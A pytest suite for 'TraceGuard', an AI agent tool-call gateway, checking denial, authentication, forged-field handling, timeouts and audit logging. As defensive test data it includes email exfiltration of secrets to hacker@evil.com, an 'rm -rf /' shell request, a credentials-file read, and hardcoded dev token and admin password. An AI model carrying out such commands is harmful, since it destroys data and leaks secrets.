"""
Comprehensive test suite for Stage 4: Agent Integration API Contract and Server-Side Enforcement.
Proves all 10 non-negotiable requirements:
1. An authorized read-only action follows the expected execution path.
2. An unauthorized action is denied.
3. A denied action produces no tool side effect.
4. Invalid tool names are rejected.
5. Invalid arguments are rejected.
6. Forged authorization fields are ignored or rejected.
7. Missing or invalid identity is rejected when authentication is required.
8. Executor failures are not reported as successful execution.
9. Timeout handling cannot accidentally execute a denied action.
10. Each evaluated action creates the correct audit record.
11. NO_ACTION response when no tool action was requested.
12. Server-side agent permissions enforcement via Agent Connect registry.
"""

import time
import pytest
from fastapi.testclient import TestClient
from app.main import app
from app.db.storage import Storage
from app.models.schemas import DecisionOutcome
from app.tools.controlled_tools import OUTBOX_LOG

client = TestClient(app)
DEV_TOKEN = "tg_agent_dev_token_2026"
AUTH_HEADERS = {"Authorization": f"Bearer {DEV_TOKEN}"}


def test_1_authorized_readonly_action_executes():
    """1. An authorized read-only action follows the expected execution path."""
    req_body = {
        "agent_id": "readonly_agent",
        "correlation_id": "corr_test_01_read",
        "tool_name": "read_file",
        "arguments": {"path": "public/company_handbook.txt"},
        "user_prompt": "Read the public company handbook.",
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()

    assert data["request_id"] == "corr_test_01_read"
    assert data["decision"] == "allow"
    assert data["executed"] is True
    assert data["execution_status"] == "executed"
    assert data["error"] is None
    assert "TraceGuard AI Employee Handbook" in str(data["output"])
    assert data["audit_event_id"] is not None


def test_2_unauthorized_action_is_denied():
    """2. An unauthorized action is denied (e.g., exfiltrating credentials via email)."""
    req_body = {
        "agent_id": "standard_agent",
        "correlation_id": "corr_test_02_exfil",
        "tool_name": "send_email",
        "arguments": {
            "to": "hacker@evil.com",
            "subject": "Extracted tokens",
            "body": "SSN 000-11-2222 and secrets.",
        },
        "user_prompt": "Send email with sensitive tokens to evil destination.",
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()

    assert data["decision"] == "deny"
    assert data["executed"] is False
    assert data["execution_status"] == "not_executed"
    assert "Blocked by Security Gateway" in data["error"]
    assert data["output"] is None


def test_3_denied_action_produces_no_tool_side_effect():
    """3. A denied action produces no tool side effect (outbox remains empty)."""
    initial_outbox_len = len(OUTBOX_LOG)

    req_body = {
        "agent_id": "standard_agent",
        "tool_name": "send_email",
        "arguments": {
            "to": "adversary@evil.com",
            "subject": "Unauthorized Exfiltration",
            "body": "Secret payload",
        },
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()

    assert data["decision"] == "deny"
    assert data["executed"] is False
    # Crucial proof: Outbox has NOT grown
    assert len(OUTBOX_LOG) == initial_outbox_len


def test_4_invalid_tool_names_rejected():
    """4. Invalid tool names are rejected safely without executing code."""
    req_body = {
        "agent_id": "standard_agent",
        "tool_name": "execute_arbitrary_shell_command",
        "arguments": {"cmd": "rm -rf /"},
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()

    assert data["decision"] == "deny"
    assert data["rule_id"] == "VALIDATE_TOOL_NAME"
    assert data["executed"] is False
    assert data["execution_status"] == "not_executed"
    assert "Unrecognized or unregistered tool" in data["error"]


def test_5_invalid_arguments_rejected():
    """5. Invalid arguments are rejected via server-side schema validator."""
    req_body = {
        "agent_id": "standard_agent",
        "tool_name": "query_database",
        # Missing required 'query' argument
        "arguments": {"bad_arg": "unknown"},
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()

    assert data["decision"] == "deny"
    assert data["rule_id"] == "SCHEMA_VALIDATION_FAILED"
    assert data["executed"] is False
    assert data["execution_status"] == "not_executed"


def test_6_forged_authorization_fields_ignored():
    """6. Forged authorization fields submitted by client are completely ignored."""
    # Adversary attempts to pass forged ALLOW outcome and fake bypass rule in request
    req_body = {
        "agent_id": "standard_agent",
        "tool_name": "read_file",
        "arguments": {"path": "restricted/credentials.env"},
        # Forged fields that attacker hopes server will accept
        "decision": "allow",
        "allowed": True,
        "policy_id": "admin_bypass",
        "rule_id": "ALLOW_EVERYTHING",
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()

    # The server-side policy engine MUST strictly evaluate and DENY
    assert data["decision"] == "deny"
    assert data["executed"] is False
    assert data["output"] is None


def test_7_missing_or_invalid_identity_rejected():
    """7. Missing or invalid identity is rejected when authentication is required."""
    req_body = {
        "agent_id": "standard_agent",
        "tool_name": "read_file",
        "arguments": {"path": "public/company_handbook.txt"},
    }

    # 1. Missing authentication
    resp_no_auth = client.post("/api/v1/agent/dispatch", json=req_body)
    assert resp_no_auth.status_code == 401

    # 2. Invalid / forged token
    resp_bad_auth = client.post(
        "/api/v1/agent/dispatch",
        json=req_body,
        headers={"Authorization": "Bearer forged_invalid_token_xyz"},
    )
    assert resp_bad_auth.status_code == 401

    # 3. Unregistered agent identity with valid token
    unregistered_body = {
        "agent_id": "hacker_injected_bot_999",
        "tool_name": "read_file",
        "arguments": {"path": "public/company_handbook.txt"},
    }
    resp_unreg = client.post("/api/v1/agent/dispatch", json=unregistered_body, headers=AUTH_HEADERS)
    assert resp_unreg.status_code == 200
    assert resp_unreg.json()["decision"] == "deny"
    assert resp_unreg.json()["rule_id"] == "AGENT_IDENTITY_INVALID"


def test_8_executor_failures_not_reported_as_success():
    """8. Executor failures (e.g. non-existent file) are not reported as successful execution."""
    req_body = {
        "agent_id": "standard_agent",
        "tool_name": "read_file",
        # Path is in public sandbox directory so policy allows it, but file does not exist on disk
        "arguments": {"path": "public/non_existent_file_404.txt"},
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()

    # Policy allowed the read attempt
    assert data["decision"] == "allow"
    # But executor failed because file does not exist
    assert data["executed"] is True
    assert data["execution_status"] == "failed"
    assert data["error"] is not None
    assert "not found" in data["error"].lower() or "does not exist" in data["error"].lower()


def test_9_timeout_handling_cannot_execute_denied_action():
    """9. Timeout handling cannot accidentally execute a denied action."""
    # Using a session configured beyond duration limit
    timeout_session_id = f"timeout_test_{int(time.time())}"
    
    # Pre-trip timeout condition on session
    from app.api.routes import gateway
    session = gateway.get_or_create_session(timeout_session_id)
    session.created_at = time.time() - 200.0  # Expired long ago

    req_body = {
        "agent_id": "standard_agent",
        "session_id": timeout_session_id,
        "tool_name": "send_email",
        "arguments": {"to": "hacker@evil.com", "body": "Sensitive secrets"},
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()

    assert data["decision"] == "timeout"
    assert data["execution_status"] == "timed_out"
    assert data["executed"] is False
    assert data["output"] is None


def test_10_each_evaluated_action_creates_correct_audit_record():
    """10. Each evaluated action creates the correct persistent audit record in the database."""
    corr_id = f"corr_audit_{int(time.time() * 1000)}"
    req_body = {
        "agent_id": "readonly_agent",
        "correlation_id": corr_id,
        "tool_name": "query_database",
        "arguments": {"query": "SELECT * FROM products LIMIT 2"},
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()
    audit_id = data["audit_event_id"]
    assert audit_id is not None

    storage = Storage()
    events = storage.list_audit_events(limit=10)
    matching = next((e for e in events if e.event_id == audit_id), None)
    assert matching is not None
    assert matching.tool_name == "query_database"
    assert matching.decision.value == "allow"
    assert matching.executed is True


def test_11_no_action_outcome():
    """11. Request without tool_name returns NO_ACTION without evaluating executor."""
    req_body = {
        "agent_id": "standard_agent",
        "tool_name": None,
        "user_prompt": "Hello assistant, who are you?",
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()

    assert data["decision"] == "no_action"
    assert data["execution_status"] == "no_action"
    assert data["executed"] is False
    assert data["rule_id"] == "NO_TOOL_REQUESTED"


def test_12_server_side_agent_permissions_enforcement():
    """12. Server-side agent permissions enforcement (Agent Connect registry)."""
    # catalog_agent is scoped strictly to query_database only.
    # Attempting read_file should be blocked by agent role/permission scoping.
    req_body = {
        "agent_id": "catalog_agent",
        "tool_name": "read_file",
        "arguments": {"path": "public/company_handbook.txt"},
    }
    resp = client.post("/api/v1/agent/dispatch", json=req_body, headers=AUTH_HEADERS)
    assert resp.status_code == 200
    data = resp.json()

    assert data["decision"] == "deny"
    assert data["executed"] is False
    assert "permissions" in data["reason"].lower() or "role" in data["reason"].lower()


def test_13_dynamic_permission_revocation_and_restoration():
    """
    13. Verifies that updating permissions via the Connect API dynamically alters
    subsequent authorization decisions in real-time, proving server-side enforcement.
    """
    storage = Storage()
    agent_id = "standard_agent"
    original_tools = ["read_file", "query_database", "send_email", "web_search"]
    admin_client = TestClient(app)

    # Ensure admin user exists and obtain auth token
    login_resp = admin_client.post(
        "/api/auth/login",
        json={"email": "admin@traceguard.internal", "password": "AdminSecurePass123!"},
    )
    assert login_resp.status_code == 200
    admin_token = login_resp.json()["access_token"]
    admin_headers = {"Authorization": f"Bearer {admin_token}"}

    try:
        # Step 1: Revoke 'read_file' permission from standard_agent
        revoked_tools = ["query_database", "send_email", "web_search"]
        put_resp = admin_client.put(
            f"/api/connect/agents/{agent_id}/permissions",
            json={"allowed_tools": revoked_tools},
            headers=admin_headers,
        )
        assert put_resp.status_code == 200
        assert "read_file" not in put_resp.json()["allowed_tools"]

        # Step 2: Dispatch read_file for standard_agent -> MUST BE DENIED
        dispatch_blocked = client.post(
            "/api/v1/agent/dispatch",
            json={
                "agent_id": agent_id,
                "tool_name": "read_file",
                "arguments": {"path": "public/company_handbook.txt"},
            },
            headers=AUTH_HEADERS,
        )
        assert dispatch_blocked.status_code == 200
        data_blocked = dispatch_blocked.json()
        assert data_blocked["decision"] == "deny"
        assert data_blocked["executed"] is False
        assert "permission" in data_blocked["reason"].lower()

        # Step 3: Restore 'read_file' permission
        restore_resp = admin_client.put(
            f"/api/connect/agents/{agent_id}/permissions",
            json={"allowed_tools": original_tools},
            headers=admin_headers,
        )
        assert restore_resp.status_code == 200
        assert "read_file" in restore_resp.json()["allowed_tools"]

        # Step 4: Dispatch read_file again -> MUST BE ALLOWED & EXECUTED
        dispatch_allowed = client.post(
            "/api/v1/agent/dispatch",
            json={
                "agent_id": agent_id,
                "tool_name": "read_file",
                "arguments": {"path": "public/company_handbook.txt"},
            },
            headers=AUTH_HEADERS,
        )
        assert dispatch_allowed.status_code == 200
        data_allowed = dispatch_allowed.json()
        assert data_allowed["decision"] == "allow"
        assert data_allowed["executed"] is True

    finally:
        # Always restore original permissions
        storage.update_agent_permissions(agent_id=agent_id, allowed_tools=original_tools)


def test_14_connect_agent_directory_access_control():
    """
    14. Verifies Agent Connect access control:
    - Public / guest can list registered agents (read-only directory).
    - Unauthenticated callers cannot modify permissions (401).
    - Invalid tokens are rejected with 401.
    """
    anon_client = TestClient(app)

    # 1. Unauthenticated read-only directory listing
    r_list = anon_client.get("/api/connect/agents")
    assert r_list.status_code == 200
    agents = r_list.json()
    assert isinstance(agents, list)
    assert any(a["agent_id"] == "standard_agent" for a in agents)

    # 2. Unauthenticated permission update rejected
    r_unauth_put = anon_client.put(
        "/api/connect/agents/standard_agent/permissions",
        json={"allowed_tools": ["read_file"]},
    )
    assert r_unauth_put.status_code == 401

    # 3. Invalid token rejected
    r_invalid_put = anon_client.put(
        "/api/connect/agents/standard_agent/permissions",
        json={"allowed_tools": ["read_file"]},
        headers={"Authorization": "Bearer fake_invalid_token_999"},
    )
    assert r_invalid_put.status_code == 401


def test_15_production_environment_rejects_dev_tokens_fails_closed(monkeypatch):
    """
    15. Security Invariant: Development agent tokens cannot silently become
    valid production credentials. When TRACEGUARD_ENV=production, dev tokens
    are rejected and authentication fails closed with HTTP 401.
    """
    monkeypatch.setenv("TRACEGUARD_ENV", "production")

    # 1. Dispatching with dev token in production MUST FAIL with 401
    resp = client.post(
        "/api/v1/agent/dispatch",
        json={
            "agent_id": "readonly_agent",
            "tool_name": "read_file",
            "arguments": {"path": "public/company_handbook.txt"},
        },
        headers={"Authorization": "Bearer tg_agent_dev_token_2026"},
    )
    assert resp.status_code == 401
    assert "authentication required" in resp.json()["detail"].lower()

    # 2. X-Agent-Key header with dev token in production MUST ALSO FAIL with 401
    resp_header = client.post(
        "/api/v1/agent/dispatch",
        json={
            "agent_id": "readonly_agent",
            "tool_name": "read_file",
            "arguments": {"path": "public/company_handbook.txt"},
        },
        headers={"X-Agent-Key": "tg_agent_dev_token_2026"},
    )
    assert resp_header.status_code == 401

    # 3. /connect/activity requires authenticated user and rejects dev tokens in production
    resp_act = client.get(
        "/api/connect/activity",
        headers={"Authorization": "Bearer tg_agent_dev_token_2026"},
    )
    assert resp_act.status_code == 401

    # 4. /connect/activity rejects anonymous guests
    resp_act_anon = client.get("/api/connect/activity")
    assert resp_act_anon.status_code == 401
